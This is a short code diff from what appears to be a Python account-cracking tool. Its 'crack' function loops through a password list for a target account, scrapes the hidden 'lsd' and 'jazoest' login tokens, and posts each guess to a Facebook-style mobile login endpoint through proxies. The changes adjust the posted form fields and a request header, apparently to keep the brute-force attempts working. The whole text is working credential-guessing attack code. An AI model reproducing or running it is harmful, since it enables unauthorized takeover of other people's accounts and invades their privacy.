@@ -643,7 +643,7 @@ def crack(idf,pwx,url,awal):
 	for pw in pwx:
 		try:
 			link = ses.get(f'https://{url}/login/?source=auth_switcher')
-			date = {"lsd":re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),"email":idf,"pass":pw,"next":"https://"+url+"/login/save-device/?login_source=login"}
+			date = {"lsd":re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),"email":idf,"pass":pw}
 			hd2 = {"Host":url,
 				"cache-control":"max-age=0",
 				"upgrade-insecure-requests":"1",
@@ -658,7 +658,7 @@ def crack(idf,pwx,url,awal):
 				"sec-fetch-mode":"cors",
 				"sec-fetch-dest":"empty",
 				"accept-encoding":"gzip, deflate br",
-				"accept-language":"en-GB,en-US;q=0.9,en;q=0.8",
+				"accept-language":"en-US;q=0.9,en;q=0.8",
 				"x-requested-with":"XMLHttpRequest",
 				}
 			bx = ses.post(f'https://{url}/login/device-based/regular/login/?refsrc=deprecated&lwv=100', headers=hd2, data=date, proxies=proxy)
